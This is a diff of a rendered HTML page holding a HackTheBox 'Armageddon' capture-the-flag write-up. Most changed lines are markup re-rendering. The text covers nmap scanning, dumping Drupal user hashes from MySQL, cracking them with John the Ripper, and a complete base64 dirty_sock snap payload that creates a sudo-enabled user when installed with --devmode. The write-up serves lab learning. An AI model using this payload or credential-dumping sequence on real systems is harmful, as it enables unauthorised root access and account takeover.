@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.118.2"><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,11 +14,11 @@
 
     <title>Armageddon Writeup (HackTheBox) | Doomdesire</title>
 
-    <link rel="stylesheet" href="/css/meme.min.47b7defd9dcca4589f4d279a79d656a7d334f973be4a3a4f1893fd20fc857df5.css"/>
+    <link rel="stylesheet" href="/css/meme.min.353693cdab7615152d304004b0e93d7af7fc743668040b9951ebb05d714ac96f.css"/>
 
     
     
-        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.a74e28464a7eeed54b4e02aead6360ae76bbd5ee5745afdf0a47319b6541600e.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.07eb0af6b6ace5741d44ee2fa3e3defd0fe88ef104f8c52f4ee23b1e0fe0b06d.js"></script>
 
     
 
@@ -287,7 +287,7 @@ Armageddon is an Easy HackTheBox machine created by <strong>bertolis</strong> ( 
 <p>We can start with the standard nmap, scanning the default ports:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -312,30 +312,30 @@ Armageddon is an Easy HackTheBox machine created by <strong>bertolis</strong> ( 
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sC -sV 10.10.10.233 -oA armageddon
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-24 04:49 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.233
-Host is up <span class="o">(</span>0.089s latency<span class="o">)</span>.
-Not shown: <span class="m">998</span> closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
-<span class="p">|</span>_http-generator: Drupal <span class="m">7</span> <span class="o">(</span>http://drupal.org<span class="o">)</span>
-<span class="p">|</span> http-robots.txt: <span class="m">36</span> disallowed entries <span class="o">(</span><span class="m">15</span> shown<span class="o">)</span>
-<span class="p">|</span> /includes/ /misc/ /modules/ /profiles/ /scripts/ 
-<span class="p">|</span> /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
-<span class="p">|</span> /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
-<span class="p">|</span>_/LICENSE.txt /MAINTAINERS.txt
-<span class="p">|</span>_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
-<span class="p">|</span>_http-title: Welcome to  Armageddon <span class="p">|</span>  Armageddon
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.80 seconds
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sC -sV 10.10.10.233 -oA armageddon
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-24 04:49 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.233
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.089s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-generator: Drupal <span class="m">7</span> <span class="o">(</span>http://drupal.org<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">36</span> disallowed entries <span class="o">(</span><span class="m">15</span> shown<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_/LICENSE.txt /MAINTAINERS.txt
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Welcome to  Armageddon <span class="p">|</span>  Armageddon
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.80 seconds
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="flags-used"><a href="#flags-used" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Flags used:</h3>
 <ul>
@@ -378,7 +378,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 <p>This means we can log in mysql to possibly find more credentials. Since we already know from the file that we have the database&rsquo;s name is drupal we are going to run the following in order to see the tables in it (password reducted):</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -455,82 +455,82 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </span><span class="lnt">75
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">mysql -u drupaluser -*************** -D drupal -e <span class="s1">&#39;show tables;&#39;</span>
-Tables_in_drupal
-actions
-authmap
-batch
-block
-block_custom
-block_node_type
-block_role
-blocked_ips
-cache
-cache_block
-cache_bootstrap
-cache_field
-cache_filter
-cache_form
-cache_image
-cache_menu
-cache_page
-cache_path
-comment
-date_format_locale
-date_format_type
-date_formats
-field_config
-field_config_instance
-field_data_body
-field_data_comment_body
-field_data_field_image
-field_data_field_tags
-field_revision_body
-field_revision_comment_body
-field_revision_field_image
-field_revision_field_tags
-file_managed
-file_usage
-filter
-filter_format
-flood
-<span class="nb">history</span>
-image_effects
-image_styles
-menu_custom
-menu_links
-menu_router
-node
-node_access
-node_comment_statistics
-node_revision
-node_type
-queue
-rdf_mapping
-registry
-registry_file
-role
-role_permission
-search_dataset
-search_index
-search_node_links
-search_total
-semaphore
-sequences
-sessions
-shortcut_set
-shortcut_set_users
-system
-taxonomy_index
-taxonomy_term_data
-taxonomy_term_hierarchy
-taxonomy_vocabulary
-url_alias
-users
-users_roles
-variable
-watchdog
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -u drupaluser -*************** -D drupal -e <span class="s1">&#39;show tables;&#39;</span>
+</span></span><span class="line"><span class="cl">Tables_in_drupal
+</span></span><span class="line"><span class="cl">actions
+</span></span><span class="line"><span class="cl">authmap
+</span></span><span class="line"><span class="cl">batch
+</span></span><span class="line"><span class="cl">block
+</span></span><span class="line"><span class="cl">block_custom
+</span></span><span class="line"><span class="cl">block_node_type
+</span></span><span class="line"><span class="cl">block_role
+</span></span><span class="line"><span class="cl">blocked_ips
+</span></span><span class="line"><span class="cl">cache
+</span></span><span class="line"><span class="cl">cache_block
+</span></span><span class="line"><span class="cl">cache_bootstrap
+</span></span><span class="line"><span class="cl">cache_field
+</span></span><span class="line"><span class="cl">cache_filter
+</span></span><span class="line"><span class="cl">cache_form
+</span></span><span class="line"><span class="cl">cache_image
+</span></span><span class="line"><span class="cl">cache_menu
+</span></span><span class="line"><span class="cl">cache_page
+</span></span><span class="line"><span class="cl">cache_path
+</span></span><span class="line"><span class="cl">comment
+</span></span><span class="line"><span class="cl">date_format_locale
+</span></span><span class="line"><span class="cl">date_format_type
+</span></span><span class="line"><span class="cl">date_formats
+</span></span><span class="line"><span class="cl">field_config
+</span></span><span class="line"><span class="cl">field_config_instance
+</span></span><span class="line"><span class="cl">field_data_body
+</span></span><span class="line"><span class="cl">field_data_comment_body
+</span></span><span class="line"><span class="cl">field_data_field_image
+</span></span><span class="line"><span class="cl">field_data_field_tags
+</span></span><span class="line"><span class="cl">field_revision_body
+</span></span><span class="line"><span class="cl">field_revision_comment_body
+</span></span><span class="line"><span class="cl">field_revision_field_image
+</span></span><span class="line"><span class="cl">field_revision_field_tags
+</span></span><span class="line"><span class="cl">file_managed
+</span></span><span class="line"><span class="cl">file_usage
+</span></span><span class="line"><span class="cl">filter
+</span></span><span class="line"><span class="cl">filter_format
+</span></span><span class="line"><span class="cl">flood
+</span></span><span class="line"><span class="cl"><span class="nb">history</span>
+</span></span><span class="line"><span class="cl">image_effects
+</span></span><span class="line"><span class="cl">image_styles
+</span></span><span class="line"><span class="cl">menu_custom
+</span></span><span class="line"><span class="cl">menu_links
+</span></span><span class="line"><span class="cl">menu_router
+</span></span><span class="line"><span class="cl">node
+</span></span><span class="line"><span class="cl">node_access
+</span></span><span class="line"><span class="cl">node_comment_statistics
+</span></span><span class="line"><span class="cl">node_revision
+</span></span><span class="line"><span class="cl">node_type
+</span></span><span class="line"><span class="cl">queue
+</span></span><span class="line"><span class="cl">rdf_mapping
+</span></span><span class="line"><span class="cl">registry
+</span></span><span class="line"><span class="cl">registry_file
+</span></span><span class="line"><span class="cl">role
+</span></span><span class="line"><span class="cl">role_permission
+</span></span><span class="line"><span class="cl">search_dataset
+</span></span><span class="line"><span class="cl">search_index
+</span></span><span class="line"><span class="cl">search_node_links
+</span></span><span class="line"><span class="cl">search_total
+</span></span><span class="line"><span class="cl">semaphore
+</span></span><span class="line"><span class="cl">sequences
+</span></span><span class="line"><span class="cl">sessions
+</span></span><span class="line"><span class="cl">shortcut_set
+</span></span><span class="line"><span class="cl">shortcut_set_users
+</span></span><span class="line"><span class="cl">system
+</span></span><span class="line"><span class="cl">taxonomy_index
+</span></span><span class="line"><span class="cl">taxonomy_term_data
+</span></span><span class="line"><span class="cl">taxonomy_term_hierarchy
+</span></span><span class="line"><span class="cl">taxonomy_vocabulary
+</span></span><span class="line"><span class="cl">url_alias
+</span></span><span class="line"><span class="cl">users
+</span></span><span class="line"><span class="cl">users_roles
+</span></span><span class="line"><span class="cl">variable
+</span></span><span class="line"><span class="cl">watchdog
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="arguments-used"><a href="#arguments-used" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Arguments Used:</h3>
 <ul>
@@ -541,31 +541,31 @@ watchdog
 <p>From all these tables, the <strong>users</strong> table is the most promising one (very common table to contain user credentials) so we are going to read it&rsquo;s contents by using the following command (password reducted):</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">mysql -u drupaluser -*************** -D drupal -e <span class="s1">&#39;select * from users;&#39;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -u drupaluser -*************** -D drupal -e <span class="s1">&#39;select * from users;&#39;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="https://netuserdoomdesire.github.io/Armageddon/9.png" alt="Pasted image 20210724055855.png"></p>
 <p>Since the output is a little crowded, we can select only the columns that mater for each user (password reducted):</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">mysql -u drupaluser -*************** -D drupal -e <span class="s1">&#39;select name,pass from users;&#39;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -u drupaluser -*************** -D drupal -e <span class="s1">&#39;select name,pass from users;&#39;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="https://netuserdoomdesire.github.io/Armageddon/database.png" alt="Pasted image 20210724060204.png"></p>
 <p>As a side note, the user Doomdesire is a user that we previously attempted to create on the initial login page. From here we get the username <strong>brucetherealadmin</strong> as well as a hash, that we are of course going to crack. To crack the hash we are going to use JohnTheRipper:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">john <span class="nb">hash</span> --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john <span class="nb">hash</span> --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="https://netuserdoomdesire.github.io/Armageddon/11.png" alt="Pasted image 20210724060632.png"></p>
 <p>Since we have now cracked the hash, we have a valid pair of credentials and log in as the user <strong>brucetherealadmin</strong> via <strong>ssh</strong>:</p>
@@ -583,11 +583,11 @@ watchdog
 <p>From the above we can conclude that this is the .snap file we want. If we can install it we will have our new user created on the box. In order to create the snap file we are going to use python2 (there are other ways to create it). We are going to use the python print funcion in order to print the base64 string and then this output is going to be piped to the base64 decoder and and then right into a .snap file. Something to point out here is that we are going to have to replace the single quotes of the github base64 string with double quotes. This is required because the single quote is going to be used for the python2 <code>-c</code> argument:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python2 -c <span class="s1">&#39;print &#34;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#34; + &#34;A&#34; * 4256 + &#34;==&#34;&#39;</span> <span class="p">|</span> base64 -d &gt; Doomdesire.snap
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 -c <span class="s1">&#39;print &#34;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#34; + &#34;A&#34; * 4256 + &#34;==&#34;&#39;</span> <span class="p">|</span> base64 -d &gt; Doomdesire.snap
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>We now have our .snap file:</p>
 <p><img src="https://netuserdoomdesire.github.io/Armageddon/15.png" alt="Pasted image 20210724070213.png"></p>
@@ -597,11 +597,11 @@ watchdog
 <p>The last step to exploit this, is to install our newly created .snap file:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">sudo /usr/bin/snap install --devmode Doomdesire.snap
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/bin/snap install --devmode Doomdesire.snap
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="https://netuserdoomdesire.github.io/Armageddon/17.png" alt="Pasted image 20210724070710.png"></p>
 <p>A very important thing to note here, is that the <code>--devmode</code> is required for this to work. As we can read from the article describing this vulnerability that is linked on the end of this writeup, snaps themselves run in sandboxes and require digital signatures matching public keys that machines already trust. However, it is possible to lower these restrictions by indicating that a snap is in development (called “devmode”). This will give the snap access to the host Operating System just as any other application would have. Now that we installed our snap, the exploit has completed and we have a new user on the box. The user&rsquo;s credentials are the following:</p>
@@ -644,7 +644,7 @@ watchdog
 
         
     <div class="updated-badge-container">
-        <span title="Updated @ 2021-07-24 19:03:42 EEST" style="cursor:help">
+        <span title="Updated @ 2021-07-24 19:03:42 &#43;03" style="cursor:help">
 
 <svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2021-07-24</text><text x="915" y="140" textLength="650" transform="scale(.1)">2021-07-24</text></g></svg>
         </span></div>
@@ -798,7 +798,7 @@ watchdog
             
     <footer id="footer" class="footer">
         <div class="footer-inner">
-            <div class="site-info">©&nbsp;2021–2021&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;Doomdesire</div><div class="site-copyright"></div>
+            <div class="site-info">©&nbsp;2021–2023&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;Doomdesire</div><div class="site-copyright"></div>
 
             
     
